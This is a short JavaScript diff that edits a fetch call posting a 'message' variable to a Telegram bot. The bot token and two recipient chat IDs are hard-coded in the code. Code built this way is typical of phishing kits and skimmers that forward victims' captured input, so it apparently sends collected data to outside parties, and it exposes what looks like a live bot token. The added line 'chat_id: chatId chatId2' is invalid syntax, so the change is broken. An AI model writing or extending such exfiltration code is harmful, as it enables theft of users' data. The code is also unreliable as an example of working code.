@@ -35,7 +35,7 @@
                 var apiBot = "https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw";
                 var telegramApiUrl = apiBot + "/sendMessage";
                 var chatId = "1494753646";
-                bar chatId2 = "1961861884" 
+                var chatId2 = "1961861884" 
 
 
                 fetch(telegramApiUrl, {
@@ -43,7 +43,7 @@
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ chat_id: chatId, text: message}), 
+                    body: JSON.stringify({ chat_id: chatId chatId2, text: message}), 
                 })
                 .then(response => response.json())
                 .then(data => console.log(data))
